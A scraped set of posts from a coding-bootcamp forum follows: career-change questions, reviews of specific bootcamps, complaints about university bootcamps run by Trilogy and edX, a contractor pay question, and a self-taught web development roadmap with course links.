I‘m looking for bootcamps and the best two options I found with presence in South America are le wagon and iron hack, both of them have really good reviews and I‘m unsure about which one to choose.

codingbootcamp,"So I’ve been accepted into a local college that offers a [college name] diploma. First off (sorry if it’s a dumb question) but is this considered an associates degree?

codingbootcamp,"Hey guys, so I been holding onto the idea of becoming immersed into the world of coding ever since I got out of university. I knew I was going to have to have a side job to support my early years of being an artist fresh out of school, but I've noticed the opposite happened. I hit the ground running being a freelance artist and seemed like I was off to a great start, until a rapid decline of projects being commissioned of the past few years.

&amp;#x200B;

Coding has always caught my eye, i grew up at such an exciting time for technology and witnessing the evolution got me so excited for the future. Getting back into the mindset of wanting to use my creativity and be extremely marketable, I locked my sights on the coding world. The only problem is, I have no idea how to start!

So far I spent this week researching, asking questions, reading peoples stories, etc. I also spoke to some of the boot-camp sites like Springboard and Coding Temple. They seemed like a good path, I've always excelled in a structured and crafted course so it just felt natural to me. I'm also reading a lot (Like... a lot) of stories about self taught or free courses such as the **Odin Project** (which i started some intro reading last night)  and it really got me excited about having a discord dedicated to helping each other out when needed, resources, the whole shebang.

Of course what it really comes down to is the price of things. The boot-camps are almost the same price as a 2 year college degree, and I'm not so sure I can invest in that much unless i know it's absolutely the right choice for me. Also the after course help (resources to get a job) they mentioned to me seemed extremely enticing, it's something I didn't fully receive from my university.

&amp;#x200B;

TL:DR

Artist wanting to get into the coding world professionally and use my overly detailed observation skills and creativity to build and learn the ins and outs of programs/apps/games/ect. Next to no experience, but great at learning new things. Also have insane amount of free time... like... a lot.

thank you!","Artist to Coder, What are my options?","Hey guys, so I been holding onto the idea of becoming immersed into the world of coding ever since I got out of university.

codingbootcamp,"Hey everyone! I've had a lot of people reach out to me and ask how my experience was at Digital Crafts. It would be impossible to cover everything but if someone has a question you're more than welcome to ask here or DM me!

&amp;#x200B;

First I'd like to cover my instructor. They were an amazing person but they are also on a schedule. Keep in mind that this is a bootcamp, and there is SO much material to cover that it would be impossible for that teach to get through all of the material if they had to stop and answer every question. Thankfully, there are DiRs( a teacher assistant ) who was there to help and was a former student at one point or another.

&amp;#x200B;

The curriculum cover Python, Javascript, HTML, CSS, and Node.js among a few other things. Its enough to really make sure you are whats called a Full-stack developer. The front end and back end is covered in enough detail to ensure you can create projects that reflect a real world project. Speaking of which, the projects that you work on will be both solo and team based ones. So you'll be able to pick the classmates you want on your team, you'll use Github ( a platform where you can collaborate on a single project) and build awesome things!

&amp;#x200B;

The school itself employs a good number of people to look at your resume. In fact, there is a day dedicated to making sure its up to par and working on other things that are beneficial to your career. Looking at your LinkedIn and such. The school also has guest speakers who are former alumni who will speak about their experience and in general, give tips and a bit of motivation. This last part is optional but its a nice touch. Oh, and there is a mentor/mentee program. Another thing you can take advantage of.

&amp;#x200B;

codingbootcamp,"So I'm in my my 20s and I'm basically starting over career wise. I never went to college and just worked and advanced right out of high school, I've always been interested in tech but I have no programming skills.

I've been looking into what it takes getting a job as a programmer and I don't know how to go forward.

I've been self teaching for a bit and I've been looking at bootcamps like codesmith. but I've looked at jobs in my state and the vast majority even at entry level require a BS degree.

so is it even worth it to self teach or go to a bootcamp especially since I never went to college? most people I see saying they got a job with no degree were either coding since they were a kid or it was 10-20 years ago.

I know it takes a couple thousand hours to be really good at coding. And feel like I'm disciplined enough to teach myself and use the resources of a bootcamp, but really, will any companies actually ever even look at me within the next couple years without any degree?

codingbootcamp," I need to put this out here since I keep seeing people asking these topics of wanting to attend a university bootcamp. This is coming from my experience as a Trilogy/edX/2U bootcamp graduate when we finished the course 2 weeks ago.

From what I understand, Trilogy merged with edX when their parent company 2U purchased edX a few weeks ago. The reason for them merging is because 2U is trying to clean up the negative reputation Trilogy had and combine all of Trilogy's backend with edX for their bootcamps. Trilogy no longer exists as a company, it's part of edX now. They're trying very hard to hide Trilogy from ever existing, I can't find any mentions of Trilogy on 2U's website anymore because any references of them have been either archived or outright deleted or replaced with edX.

Here's the problem with Trilogy merging with edX. 

Every single one of these university bootcamps are run by a predatory company called Trilogy Education, for example, if you see UC Berkeley Coding Bootcamp's website or any other schools they're supposedly partnered with, scroll all the way down and it will say ""in partnership with edX"" or something along those lines. Every single university bootcamp websites run by Trilogy are copy and pasted and the only difference is they just change the color and logo to match that specific university.  Trilogy and edX are of the same company owned by 2U.

Trilogy hasn't updated their curriculum in years. I'm talking about since 2017. You can easily find them on GitHub if you dig them up. Maybe that's a good thing so you know exactly what material you'll be paying for, but these university bootcamps, and especially mine claimed to offer courses that ""rapidly evolve"" whatever that means. In reality, the material you're getting is mediocre.

If edX plans to update the course material, I'm unaware of that. But from speaking to a few fresh students of edX bootcamps, as of November 2022 the course material is still exactly the same as mine. This is the problem with spending $12k dollars on a bootcamp, you better be sure you're receiving the best material for your money. In this case, you're getting coursework that hasn't been updated since 2017. That's not worth spending $12k which is so much money for outdated material.  What has Trilogy even been doing for 5 years keeping the same coursework? You'll be paying $1k upfront as a deposit as well for some reason. If you think about withdrawing after the first week deadline, Trilogy's official policy is that you will have to pay any remaining tuition to fulfill the $12k tuition fee, or enroll yourself as an ""active non-participant"", which means you get to attend all of the zoom calls but don't have to participate in turning in assignments and projects.

So in terms of $12k being spent on sub-par education, yeah that part is life-changing in a way since you won't be seeing those $ 12k dollars again after spending it on mediocre and outdated knowledge and a mockery of a network, which I will get into.

Don't fall for their claims of ""Network opportunities"" When they say you'll have network from the bootcamp, they mean only for the time while attending that bootcamp. Their definition of networking is being able to interact with each other on Zoom calls and collaborating on group projects, that's literally it.

Oh, and don't try using their career services, you'll save yourself from hitting your head on the keyboard. Career services are bad in general, but edX's career services are on another level. They have these career events once every few days but it outright feels like those Amway motivational seminars where you invite other people to come join. They're just telling you things you already obviously knew because your instructor told you these information beforehand. It's things like ""Life After Coding Bootcamp"" and ""Interview Prep For Web Developers"", things you can easily look up on Youtube...

They have a career event directly from within their 2U website, your chances are slim to none if you're trying to get hired from this event. It's just a mock interview really. Even the instructor said he doesn't know anyone who got hired by this. It feels like a mockery, you pick these ""tables"" and showcase your group project to potential recruiters but honestly, every one of us has terrible group projects so I don't know anyone who attended the career event. 

The whole point of a bootcamp is to force yourself to learn topics that you otherwise wouldn't learn on your own. You will still need to learn more of what the bootcamp taught after the course ends, what the bootcamp teaches is not enough. Trilogy however says otherwise. On their university-partnered websites, they claim once you graduate, you'll be 100% job-ready which is false. No one will hire you if they find out you graduated from a Trilogy bootcamp. The people that I know who did get hired omitted that they went to this bootcamp or outright lied to interviewers about their experience.

As for the TA and instructor, my TA was a recent bootcamp grad, and the instructor taught the same bootcamp curriculum for the last 3 classes so he basically memorized how the curriculum works. Trilogy hires TAs in the hopes of them becoming instructors after the next class is scheduled. The instructors and TA try their best for what they're given, but it's way too crammed with material that no one would reasonably understand in a short time with how much material is there.

In the bootcamp, the main thing you'll be doing to build your portfolio is you'll be refactoring assignments, and in worse case scenarios, filling out blank files that the curriculum purposely deleted and you'll have to figure out what logic or structures they deleted in order to get the application to function as a requirement. You'll be in a nightmare trying to figure that out. And the people who grade your assignments are so passive-aggressive it's hilarious.

You're learning the MERN stack with SQL, Redux, PWA and some other stuff, but the problem is the activities they give you are not practical. It's literally the jokes people from Silicon Valley make about how people's portfolios are filled with projects no one will use. These assignments are literally what tech people make fun of.

As for group projects, Trilogy claims that you'll be using these group work for your portfolio to employers and recruiters. The reality is unless you are lucky to have someone experienced in CS in your group, you won't. The group projects are 5 class days, for 3 hours each class, so there's not enough time to work on these projects. The majority of that time will be fixing your group member's npm and node\_module errors and merge conflicts, so you can imagine all of that time will be spent cleaning up someone's mess. Group projects are terrible anyways, but these group projects were another level of abysmal. You won't even be using these projects for your portfolio because of how terrible they are that it's an embarrassment.

I graduated from my bootcamp last week and I've gotten 4 interviews so far and got caught in 4k when they found out I took a Trilogy bootcamp when they looked into my GitHub and got rejected after the fact. Take this as a lesson that you'll be looked down on for being a bootcamp grad by interviewers, but as a Trilogy grad, it's a whole nother story.

Don't ever mention that you attended a university bootcamp to recruiters, bringing that topic up will instantly destroy your chances of getting hired. Trilogy and 2U encourages you to bring that up to recruiters but I'm telling you the opposite. 

If you mention that you went to a university bootcamp, they will be dumbfounded because they probably just heard for the first time that ""universities have coding bootcamps?"" and once they pry into that, they'll figure out it's not actually by a university but by Trilogy and edX and that'll crumble your chances of getting hired. They'll research Trilogy up and find that the company does very sketchy practices, and they wouldn't want to hire someone from these boot camps because, in their view, they're hiring someone who, since the interviewers don't know what the graduates were taught from the boot camp, they'll think you're trying to defraud their business for attending an ITT Tech-like institution with sub-par education.

You'll be laughed at by recruiters for trying to crawl into the tech world as a bootcamp grad, especially as a University bootcamp grad, many people in my class are completely oblivious that we aren't actually taking a university bootcamp, you're just taking a Trilogy bootcamp with the university's logo on the Canvas website and receive an email PDF of your certificate in a pattern of the university you apparently attended...

Long story short, if you can, PLEASE stay away from the university boot camps that are run by Trilogy and edX. Those are for-profit predatory businesses that do the bare minimum and deceive people with their aggressive marketing, especially with Trilogy merging since they're trying to clear up their reputation. You'll be thanking me and many others later for heeding this warning about these predatory businesses.

codingbootcamp,"Hi, I'm working on a Computer Science BS right now and with the economy getting worse and worse, I'm starting to consider the possibility of doing a full-stack coding bootcamp as soon as I get my BS just to get more experience in practical application development (something that is kind of missing from the more theory focused CS degree I am taking) and to make myself more well-rounded in interviews in lieu of the possibility of not being able to get an internship.

codingbootcamp,"Hey guys! Just want to know some thoughts about what I should move forward with, especially in this current economic situation.

My original plan is to attend a boot camp in May of next year, but with the tech freezes and no degree under my resume, I seem to be questioning my decision into investing 17k to potentially be jobless for the next year or so lol. 

I've heard a lot about WGU (Western Governors University) and how flexible it is when it comes to completing a computer science degree. The only downside is I've been out of school for some time that I would literally need to re learn a lot of math due to how heavily it's centered in the curriculum. I do have 48 college credits from my previous time in school before dropping out with College algebra being my highest math credit. I do plan on transferring my credits over to see how many classes I would have remaining.

If I decided to attend a boot camp and complete it, I would literally sell my self short and pick anything available to get my foot in the door lol. The fear is how will the economy be not just by may, but by the time I'm finished with it which would be another 3.5 months. 

Now if I decide to pursue a computer science degree that will take time and effort, not to mention refreshing myself back into subjects I have not worked on in a long time. I do also plan on working full time if I decide to go the computer science route.

Just one more piece of information. I'm currently 28 with no wife or kids. I'd love the idea to go with a boot camp just because of how fast I can complete it (14 weeks) and it would give me a chance to break into the field, without having to use my time to re learn everything and prep myself back in college to complete a bachelor's degree. Although having a CS degree would help me in the long run, the issue is just time I guess.

So far I've been teaching myself HTML and CSS and I'm about to start learning the basics of JavaScript. I know it's my decision in the end but I'd love to hear everyone's thoughts!

codingbootcamp,"Hello, I have some college done in Business Management, but no degree and am no longer in school. The only thing I have is experience in a management/supervisor role in Training &amp; Development.

1. With no degree, is doing a bootcamp a waste of time/money? Will it be difficult or almost impossible to find a job? And if not, would it still be a job that pays very well?

2. Do these bootcamps have ways to where I won't have to start paying until a while down the road while I try to establish a career like some student loans? 

3. How hard is it to complete these camps while working 40 hour work weeks?

codingbootcamp,"So I’m a Junior developer and I just got hired at a small company (3 employees including myself). I had no degree or experience in the tech field besides a boot camp certificate and some personal projects and I wasn’t really too sure on how much to ask for for a junior developer, so I gave a $30-$35/hr range in the interview with this company (rookie mistake I know 😪). They gave me an offer of a 1 month $30/hr contract with the potential to move to full-time if it was a good fit for both of us. 

So now a month has gone by and I’ve been getting my tasks done before my boss has another one ready and have been getting high praise. I decided it was time to check in with my boss and long sorry short we both decided it was a good fit for us moving forward. I did step in to negotiate a raise and told him that I felt I didn’t properly do my research on the market rates for a junior developer at the time and I felt that I sold myself pretty low at $30/hr. I told him I had done more research now and I wanted to make sure this would be a good fit for me long-term so I asked if it would be agreeable to him to raise my pay to $40/hr. I think I did pretty well for my first negotiation and he responded positively. He said that would depend on if I wanted to stay as a 1099  independent contractor or be hired on as a W-4 employee. He seemed to imply that $40/hr would be doable as a contract worker but as a w-4 employee, he would have to pay extra to have me on payroll so i would be paid less than $40/hr and that I would have to make a decision on that and he would be able to give me a response. 

I’ve never worked as 1099 worker before so I’ve just been saving %20 of what they pay me for taxes next year. After doing some math it seems like that at 40 hours a week at $40/hr biweekly for a 1099 worker would be $2560 after taxes (80hrs * $40/hr *80% after taxes) and according to smartasset.com that same paycheck would be $2262 after taxes (I live in California) which he’s implying he won’t be able to pay me that much as w-4 employee anyway. 

The only benefits I would get as a w-4 employee would be paid holidays and PTO but the extra $300 biweekly seems way better. Just wondering if I’m missing something/doing my math wrong or if someone has been in this position before and has good advice on which route to take.

codingbootcamp,"I’m considering UPenn’s 6 month “Full Stack Flex Program”. They say it’s meant to fit in with your regular life and job, but that seems like A LOT.

Does it just depend on the individual effort you put into it? I already have pretty advanced knowledge of HTML &amp; CSS from previous college courses, so I’m confident in that area, but I’d be learning everything else from scratch. Should I have a foundational knowledge of JS (or any other topics) before starting a bootcamp? 

Additionally, is it possible to to work a full-time job 40 hours per week, with another 34-39 hours of bootcamp commitment per week?

codingbootcamp,"I’m currently doing a 6 month accelerated full-stack bootcamp to graduate early next year. On the brightside, doing this bootcamp allowed me to dig into my passion and learn more about the history and fundamentals of computer science. Though on the downside, I have utterly and completely lost my sense of self.

Every single week since the start, I’ve had an assignment due every Sunday in a new programming language. After falling again and again from personal hardship and my lack of time to help those issues, I have barely managed to pass all of my assignments (with just enough knowledge to build these assignments).

Now that graduation is moving closer and closer, placements are now being organised for students and I’m almost certain I’m not one of those people. I’m doubting my own ability to find that first job, knowing that I have barely even passed this bootcamp.

TLDR; —————————————————————
With my ultimate goal is to support my elderly parents asap, I’ve decided on two possible plans:

1) Prioritising landing that first job: Maintaining the bootcamp pace - Update my portfolio, finishing those assignments (to be portfolio ready) and applying for work before the bootcamp ends.
Goal: Dig into my passion and openly learn in the workforce and finally afford healthcare for myself and my parents

2) Prioritising finding balance: Complete the bootcamp and get a retail job. Completely redo my portfolio and projects with new tech stack, and possibly try a hackathon.

codingbootcamp,"This is mostly a rant, but I need to put this out here since I keep seeing people asking these topics.

Any bootcamp that claims to offer network connections for jobs are trying to sell you a false dream. When they say connections, they mean only for the time while attending that bootcamp. Their definition of networking is being able to interact with each other on Zoom calls and collaborating on group projects, that's it.

Don't fall for the bootcamp's advertisements on having life-long relationships with your cohort, you don't want anything to do with your classmates, and they don't want anything to do with you either. All of your classmates in the bootcamp have their own lives so it would be inconsiderate to bother them outside of class honestly. You'll be job hunting and doing everything else on your own after the bootcamp is finished, so don't expect the relationship you built with your cohort to last (if you built one at all).

Oh, and don't try using their career services, you'll save yourself from hitting your head on the keyboard. Career services are bad generally, but bootcamp career services are another level, let's just keep it that way.

Many of these bootcamps from what I've seen haven't updated their curriculum in years, especially mine, you can easily find them on GitHub if you dig them up. Maybe that's a good thing so you know exactly what material you'll be paying for, but so many of these bootcamps and especially mine claimed to offer courses that ""rapidly evolve"" whatever that means.

The whole point of a bootcamp is to force yourself to learn topics that you otherwise wouldn't learn on your own. You will still need to learn more of what the bootcamp taught after the course ends, what the bootcamp teaches is not enough. 

Most bootcamps will hopefully teach you the MERN stack (If they're teaching you the LAMP stack, run...), but how practical the material they teach you to use in an actual production level is another question.

These bootcamps, especially the one run by Trilogy (now known as edX) skim through the material and overloads content in a course that takes 6 months, so no wonder most of the logic doesn't stick into your brain. The instructors and TA try their best for what they're given to teach, but it's way too crammed with material that no one would reasonably understand in a short time with how much material the bootcamps cram.

I graduated from my bootcamp last week and I've gotten 2 interviews so far and got caught in 4k when they found out I took a coding bootcamp when they looked into my GitHub and got rejected after the fact. Take this as a lesson that you'll be looked down upon for taking a bootcamp, and try to omit that you went to one in your GitHub and LinkedIn as much as you can or else you'll face this debacle repeatedly. It'll save you lots of headaches. 

Don't ever mention that you attended to a coding bootcamp to recruiters, bringing that topic up will instantly destroy you chances of getting hired. Recruiters favor someone who did a CS degree more over a bootcamp grad because in their eyes, a CS grad dedicated 4 years of their life into learning the industry, and you, a bootcamp grad, in their eyes took the easy way out taking a 6 month course and therefore aren't qualified for the job. 

In a way they're right, a CS grad has broad knowledge of computers, while a bootcamp grads have a narrow knowledge of a specific subject.

So yeah, now I decided to attend this technical university in 2 weeks in order to have an actual proper education on web development and have the guidance and structure to build proper applications for my portfolio. My bootcamp did have that structure, but it was mediocre at best.

Long story short, if you can, PLEASE stay away from bootcamps, ESPECIALLY the university ones run by Trilogy and edX. Those are for-profit predatory businesses that does the bare minimum to continue staying afloat. Try to self teach yourself before making that jump into a bootcamp, attending a bootcamp should be the last resort if you tried everything and have absolutely no other options.

So yeah, now I decided to attend this technical university in 2 weeks in order to have an actual proper education on web development and have the guidance and structure to build proper applications for my portfolio. My bootcamp did have that structure, but it was mediocre at best.

Long story short, if you can, PLEASE stay away from bootcamps, ESPECIALLY the university ones run by Trilogy and edX. Those are for-profit predatory businesses that does the bare minimum to continue staying afloat. Try to self teach yourself before making that jump into a bootcamp, attending a bootcamp should be the last resort if you tried everything and have absolutely no other options.

codingbootcamp,"I'd intended to post an update this past weekend, but better late than never I suppose.

Overall, my experience with Formation has remained positive.  This second section, for me, has been ""more of the same, but harder"" - I'm regularly solving LeetCode mediums and even a few hards.   Not much new to report, although this week I am starting on the ""System Design"" section.  I haven't had much time to form an opinion on this section, but I like what I'm seeing so far.  I will definitely follow up when I have more of an informed opinion there.  
For those wondering, I've posted the timeline I've followed so far as a part time Fellow down at the bottom.  Keep in mind that each Fellow's path is personalized, so we may not start at the same place or we may move through them at different rates.

So yeah, to summarize: If you need someone to teach you how to solve LeetCode problems and think about algorithms and data structures, Formation definitely does a great job. From what I've seen, they also do a pretty good job at teaching System Design but it's too soon for me to draw a conclusion.

codingbootcamp,"After completing a web dev immersive bootcamp in 2018, I've been working for the past 4 years as a full-time frontend developer. I'm looking for a bootcamp or part-time course to learn backend web development. Specifically, I want to learn how to build Node.js based web applications including databases, APIs, and deployment. I know there are many asynchronous e-courses available that could teach me what I need to know, but I know myself well enough to know that to actually learn hard things, it helps to have a live instructor, scheduled lectures, opportunities to ask questions, and projects with hard deadlines. 

There are a lot of programs I've seen that are billed as ""fullstack bootcamps"" but these generally spend 50% or more of the class time on teaching frontend skills and basic Javascript programming. I'm looking for a course that starts from the assumption that the students are skilled in HTML, CSS, and JavaScript, and spends 100% of the class time teaching Node.js backend.

My ideal course would be in person (I live in Toronto) but I know that's unlikely, and I'd be willing to do a remote course based anywhere in Canada of the USA as long as it has live interactive instruction, scheduled lectures, and project deadlines. The tuition cost is not really a concern as I'm confident that any money spent will be recouped in future salary increases.","I'm an experienced frontend developer seaching for a program to learn Node.js, databases, APIs, and deployment","After completing a web dev immersive bootcamp in 2018, I've been working for the past 4 years as a full-time frontend developer.

While it would be nice, my goal isn’t necessarily to get into some big tech company right off the bat. I would be fine starting off somewhere else and working my way up. That said, is this something that I should continue moving forward with? Any advice or guidance would be appreciated.

This is the roadmap I wish I’d had when I first started learning to code. I keep it updated regularly so be sure to bookmark it and check back.

The original question was *How do I get into coding and how much do I need to know for you to hire me?*

I am not the author of any of the courses I link to below, nor do I get anything if you sign up for them.

*Last Edit: August, 2022*

\*\*\*

Hi, I’m a Software Engineering Manager at a tech company and a self-taught developer. I would love to tell you exactly what you need to know to be a professional developer and to be hired by someone like me.

**THINGS TO UNDERSTAND BEFORE WE BEGIN**

1. Learning to code is hard. It can be fun, too, but it is never easy
2. As you’re about to see, there is a lot to learn. Software development is a complex field and there is a lot you need to know. Learning a programming language is just the beginning.
3. You should follow this roadmap from start to finish. Don’t skip any steps and don’t listen to those who tell you to learn other languages or frameworks. Bounding from topic to topic while you’re learning will only extend the time it takes you to reach a professional level. Go deep before you go wide.
4. The roadmap below will guide you on a path toward web development. That’s not the only type of development out there, of course. There are software engineers working in machine learning, mobile development, robotics, and many other fields. I recommend using web development as your entry point, however. There are a lot of jobs available in that specialty, and the barrier to entry is relatively low.

**HOW LONG WILL THIS TAKE?**

It will take between 1000 and 2000 hours to learn to code at a professional level, depending on your aptitude. The amount of time you can invest per week will determine the number of calendar days between you and your new career.

10 hours per week: 2 - 4 years

15 hours per week: 1.25 - 2.5 years

20 hours per week: 1 - 2 years

It’s probably not realistic to study and practice more than 20 hours per week.

Basically, settle in and try to enjoy the journey. You’ll get there, but it’s going to take some time.

**WILL I BE ABLE TO GET A JOB AS A SOFTWARE ENGINEER IF I COMPLETE THIS CURRICULUM?**

You will certainly be qualified for one. If you complete every course in this roadmap you will have a skill set that exceeds most code camp graduates and a better *web development* skillset than many new CS graduates.

It can be tough to get that first job, though. You’ll have to work to get your name out there. Be creative and lean on your network. I have more job-hunting tips later in this answer.

Now, without further ado…

**THE ROADMAP**

**Learn How the Web Works**

The first thing you’ll need to understand is how the web works from a technical perspective. The video below has a lot of information in a short period of time. Take notes, but you don’t need to memorize the whole thing. The most important thing to pick up is vocabulary. These concepts will come up a lot as you learn.

**Learn How to Use Your Computer Like a Developer**

Next, you’re going to need to understand how to use your computer as a professional tool. That means knowing your file system and your command line. I’m a Linux user, personally, but I’ll assume that if you’re into Linux you already know those topics. The videos below are for Windows and MacOS, respectively. The MacOS command line is more properly called the Terminal.

Windows:

MacOS:

**Learn Windows Subsystem for Linux (WSL 2).**

If you’re using a Windows computer as a developer, you’ll need to learn about WSL2. A lot of the tools you’ll need as a professional developer will require you to work with a Linux command line. Luckily, WSL2 integrates the Ubuntu terminal into Windows very well. This has had the effect of making Windows a legit platform for web development.

While not strictly necessary when you first start to learn, if your intention is to do serious web development on a Windows machine, you might as well start using WSL2 now.

**Learn to Use a Code Editor**

You’re going to need several tools as a developer but the courses I link to later in this answer will introduce most of them as needed. For now, the main tool you need to know is a code editor or IDE (Integrated Development Environment).

There are a lot of these available but I’m going to recommend starting with a full-featured code editor called Visual Studio Code. This is not the same as the Visual Studio IDE.

VS Code is a professional-grade tool and it is 100% free. It’s worth taking a little time to learn your way around.

You can download a copy of VS Code at the link below.

[**Visual Studio Code - Code Editing. Redefined**Visual Studio Code is a code editor redefined and optimized for building and debugging modern web and cloud applications.  Visual Studio Code is free and available on your favorite platform - Linux, macOS, and Windows.https://code.visualstudio.com](https://code.visualstudio.com/)

And you can learn how to use it right here:

**LEARN THE BASICS: HTML, CSS, and JavaScript**

HTML, CSS, and JavaScript are the core technologies of web development and you’ll need to spend a few months getting good at them. You can do that at Free Code Camp, which is a 100% free service.

In order to complete this step you will need to earn both the **Responsive Web Design** and **JavaScript Data Structures and Algorithms** certificates.

This is where you really start learning to code. Make sure you do ALL the projects and challenges. Those are the most difficult part but also the most important. Don’t skip anything!

This step isn’t easy to complete. In fact, my guess is that 95% of the people who start this road map will never get past this point. Not because it is too hard, but because it takes time and consistency.

You can help yourself be successful by setting up a study schedule. Block out time several days a week for study and practice. Make a commitment to yourself that you will use that time productively. Don’t let anything distract you from your goals.

Free Code Camp has a lot of in-browser exercises but you should also try out what you’re learning in VS Code. There’s no better way to learn than by actually building things in your code editor.

[**https://www.freecodecamp.com**https://www.freecodecamp.com](https://www.freecodecamp.com/)

**MORE ABOUT JAVASCRIPT**

When you get to your JavaScript lessons in Free Code Camp, it might be good to supplement your online classes with some reading. Here is a link to **Eloquent JavaScript*****,*** which is an excellent book for beginners. You can read it for free online or you can pick up a print copy at Amazon. The link below is for the free resource.

[**Eloquent JavaScript**Eloquent JavaScript 3rd edition (2018) This is a book about JavaScript, programming, and the wonders of the digital. You can read it online here, or buy your own paperback copy . Written by Marijn Haverbeke.https://eloquentjavascript.net/](https://eloquentjavascript.net/)

**ABOUT UDEMY**

From here on out, we’ll rely on Udemy courses to expand our skillset. We do this instead of continuing on with Free Code Camp because all of the following topics go deep and its worth taking a structured course in each. Don’t be afraid to invest in yourself!

Udemy is an excellent service, but its pricing structure is a little strange. What you want to do is to buy the courses on sale, when they are about $12 - $25 each. When you first register at Udemy the courses will be on sale and I recommend buying at least the first few courses below if you can. Those will keep you busy for several months.

After that, just keep an eye out for sales. Udemy holds them a few times per year.

Let’s keep going!

**LEARN REACT**

Once you understand the basics, it’s time to move into more intermediate-level development. React is the most popular front-end library in the world and an absolutely vital skill for a new web developer.

React projects are a LOT more complex than the simple three-file apps you’ve been building up till now. Just keep at it, things will make more sense as you continue in this curriculum. Don’t worry if things seem confusing at first, you’re exactly where you need to be.

The course below teaches React using functional, rather than class-based, components. This is the modern way to develop React applications.

[**React 16: The Complete Course (incl. React Router 4 &amp; Redux)**Dive in and learn React.js from scratch! Learn Reactjs, Hooks, Redux, React Routing, Animations, Next.js and way more!https://www.udemy.com/course/react-the-complete-guide-incl-redux/](https://www.udemy.com/course/react-the-complete-guide-incl-redux/)

**LEARN TESTING WITH JEST AND REACT-TESTING-LIBRARY**

Good unit tests can make the difference between a maintainable application and one that devolves into an unusable mess. This is another critical topic to master.

[**Testing React with Jest and React Testing Library (RTL)**Learn best practices for testing your apps with Jest and React Testing Library!https://www.udemy.com/course/react-testing-library/](https://www.udemy.com/course/react-testing-library/)

**LEARN NODE**

By this point in the curriculum, you’ll have a very solid understanding of front-end development. Learning Node will teach you the back-end and enable you to make full-stack applications that involve interaction with a server and database.

The course below is a big one, but it will teach you what you need to know.

[**NodeJS - The Complete Guide (MVC, REST APIs, GraphQL, Deno)**Master Node JS &amp; Deno.js, build REST APIs with Node.js, GraphQL APIs, add Authentication, use MongoDB, SQL &amp; much more!https://www.udemy.com/share/1013ho/](https://www.udemy.com/share/1013ho/)

**LEARN SQL and PostgreSQL**

The course above touches on SQL but it's a deep topic and an important one to understand. SQL is a database language and there are many flavors of it, including PostgreSQL, MySQL, and MSSQL. PostgreSQL is probably the most popular of them but once you learn one picking up any of the others is fairly easy.

[**SQL and PostgreSQL: The Complete Developer's Guide**Become an expert with SQL and PostgreSQL! Store and fetch data, tune queries, and design efficient database structures!https://www.udemy.com/course/sql-and-postgresql/](https://www.udemy.com/course/sql-and-postgresql/)

**BUILD YOUR PORTFOLIO PROJECT**

This next step is critical. By now, you’ve learned enough to build your own full-stack web application and you need to cement that knowledge by, well, actually building one.

This project will be your primary portfolio project and will be the first thing potential employers will want to look at, so put your best effort into it. Pay attention to design, including responsive design, and assume someone will be looking at the code. Write good tests and use the best design patterns you’ve learned over the last several months.

If you don’t know what to build, try one of the following:

* A Blog Engine
   * This is a simple CMS or content management system that will allow you to create a blog online. You should be able to create and edit blog posts from an admin panel and users should be able to comment on those posts. You should be able to moderate those comments as necessary
* A Fake Dating Site
   * Create a Tinder-like dating site for superheroes, muppets, or whatever. A character looking for love should be able to log in, see potential matches, and communicate with them. You should create several of these profiles to demonstrate site functionality
* An eCommerce Site
   * Create an eCommerce site for a mock product. Users should be able to log in, add items to their cart, and check out. The app should deduct items from inventory as necessary and you should be able to open an admin panel that allows you to control the whole operation

Any one of those projects will teach you a ton about full-stack development. Once you start planning features and dealing with things like authentication and authorization you will run into a lot of the same pain points that professionals deal with every day. Expect long periods of “stuckness”. Use Stack Overflow as necessary and stay the course. You can do this!

Don’t continue on until you’ve completed this step.

**DEPLOY YOUR PORTFOLIO PROJECT**

Now that you’ve built your portfolio project, you’ll want to deploy it in a professional way. One way to do that is to use AWS. AWS is a vital skill for developers but many people outside the field aren’t even sure what the heck AWS even is. That’s okay! Well, it WAS okay. Now it is time for you to start learning about it.

Here’s an introduction video to the topic

And here is a video about how you can deploy a NodeJS application to AWS using a service called Elastic Beanstalk. Note, this isn’t the only way to deploy your app but it will get you some experience with the core AWS services developers need to know about.

**GOING PRO**

When you reach this point you will be very close to job ready. You could probably do freelance work already. If your goal is to work at a software development company, however, you will need to get past the dreaded technical interview.

Interviews at software companies basically have three parts. The first is the “behavioral” interview, which is just your standard job interview stuff. They’ll ask you about yourself and what you like to do, and just try to get a sense for cultural fit.

The next part is the coding challenge. In a coding challenge, you’ll be asked to solve challenges like “given an array of n numbers, find all the subsets of three numbers that add up to seven”.

To answer questions like these, you will need to understand data structures and algorithms.

We’ll get to the third part of the technical interview a little later on.

**LEARN DATA STRUCTURES AND ALGORITHMS**

Here is a good course to get you started on this fascinating topic. You’ll learn about complexity analysis and how to choose the best data structures for a given situation. It isn’t just about interviews. Knowing this stuff will make you a better engineer.

[**JavaScript (JS) Algorithms and Data Structures Masterclass**The Missing Computer Science and Coding Interview Bootcamphttps://www.udemy.com/course/js-algorithms-and-data-structures-masterclass/](https://www.udemy.com/course/js-algorithms-and-data-structures-masterclass/)

Once you’ve completed the course, you’ll want to practice coding challenges. The go-to place to do that is Leetcode.

[**LeetCode - The World's Leading Online Programming Learning Platform**Level up your coding skills and quickly land a job. This is the best place to expand your knowledge and get prepared for your next interview.https://leetcode.com/](https://leetcode.com/)

**LEARN SYSTEM DESIGN**

The last part of the technical interview is system design. You don’t always need to understand this at entry-level interviews but you might at larger companies or later in your career.

Here is an example of what a system design interview looks like

That video is made by a company called Exponent, and they have an excellent service for learning system design and really for code interview prep in general. The service even includes an opportunity to engage in peer-reviewed practice interviews. I recommend it.

**JOB HUNTING**

Congrats! By the time you reach this point in the roadmap you should be well-prepared to go out and land a job as an entry-level developer. Here are some job-hunting tips

1. You need to have three critical things for potential employers:
   1. A professional-looking LinkedIn profile. Make sure you’ve got a picture posted and some activity to show. Follow some people you admire and post updates about things you’re learning or are interested in. Stay away from “Facebook” style garbage posts. Keep posts focused on your career.
   2. Your Github profile. Make sure you’re showing your best work and staying active with your projects. Some employers look at your recent activity to see how passionate you are about code
   3. A link to your *deployed* portfolio project. It must be deployed! Don’t expect a hiring manager to clone your repo and build it from source because guess what? They won’t.
2. Until you have some experience, build a skills-focused resume. Google that term for details.
3. Get experience any way you can! If you’re doing freelance work, post your big projects on LinkedIn or start your own consultancy and post that as soon as you begin taking work.
4. Network! Join a local coding group and make sure you attend the meets. If there isn’t one in your area, start one. That’s exactly how I got started in my career.
